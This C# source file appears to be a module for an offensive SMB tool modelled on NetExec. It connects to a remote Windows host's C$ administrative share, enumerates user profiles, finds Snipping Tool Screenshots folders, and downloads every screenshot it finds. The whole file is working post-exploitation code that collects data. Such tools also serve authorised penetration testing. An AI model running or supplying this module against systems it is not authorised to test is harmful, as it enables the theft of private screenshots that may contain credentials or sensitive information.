using Titanis;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec snipped: downloads Snipping Tool screenshots (found via *\Screenshots).
/// Options: USERS=user1,user2 (comma list filter).
/// </summary>
public sealed class SmbSnippedModule : AtlasModule<Smb2Client>
{
	public override string Name => "snipped";
	public override string Description => "Downloads screenshots from Users\\*\\*\\Screenshots";

	private static readonly string[] SkipUsers = new[] { ".", "..", "all users", "default", "default user", "public" };

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		var filter = ctx.Option("USERS", "");
		var wanted = new HashSet<string>(filter.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries), StringComparer.OrdinalIgnoreCase);
		int downloaded = 0;
		try
		{
			await using var usersDir = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, "C$", "Users"), cancellationToken).ConfigureAwait(false);
			foreach (var u in await usersDir.QueryDirAsync(cancellationToken).ConfigureAwait(false))
			{
				if (!u.IsDirectory || SkipUsers.Contains(u.FileName, StringComparer.OrdinalIgnoreCase)) continue;
				if (wanted.Count > 0 && !wanted.Contains(u.FileName)) continue;
				cancellationToken.ThrowIfCancellationRequested();
				// Probe one level under the profile for a Screenshots dir
				List<Smb2DirEntry> subs;
				try
				{
					await using var pd = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, "C$", $"Users\\{u.FileName}"), cancellationToken).ConfigureAwait(false);
					subs = await pd.QueryDirAsync(cancellationToken).ConfigureAwait(false);
				}
				catch { continue; }
				foreach (var sub in subs)
				{
					if (!sub.IsDirectory || sub.FileName is "." or "..") continue;
					string shotDir = $"Users\\{u.FileName}\\{sub.FileName}\\Screenshots";
					List<Smb2DirEntry> shots;
					try
					{
						await using var sd = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, "C$", shotDir), cancellationToken).ConfigureAwait(false);
						shots = await sd.QueryDirAsync(cancellationToken).ConfigureAwait(false);
					}
					catch { continue; }
					foreach (var shot in shots)
					{
						if (shot.IsDirectory || shot.FileName.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase) || shot.Size == 0) continue;
						try
						{
							await using var stream = await ctx.Client.OpenFileReadAsync(new UncPath(ctx.Host, "C$", $"{shotDir}\\{shot.FileName}"), cancellationToken).ConfigureAwait(false);
							using var ms = new MemoryStream();
							await stream.CopyToAsync(ms, cancellationToken).ConfigureAwait(false);
							string clean = $"{ctx.Host}_{u.FileName}_{sub.FileName}_{shot.FileName}".Replace('\\', '_').Replace('/', '_');
							await File.WriteAllBytesAsync(clean, ms.ToArray(), cancellationToken).ConfigureAwait(false);
							downloaded++;
							AtlasConsole.Success($"{ctx.Host}:445", $"(snipped) {shotDir}\\{shot.FileName} ({ms.Length} bytes -> {clean})");
						}
						catch { }
					}
				}
			}
			AtlasConsole.Info($"{ctx.Host}:445", $"(snipped) {downloaded} screenshot(s) downloaded");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(snipped) Failed: {ex.Message}");
		}
	}
}
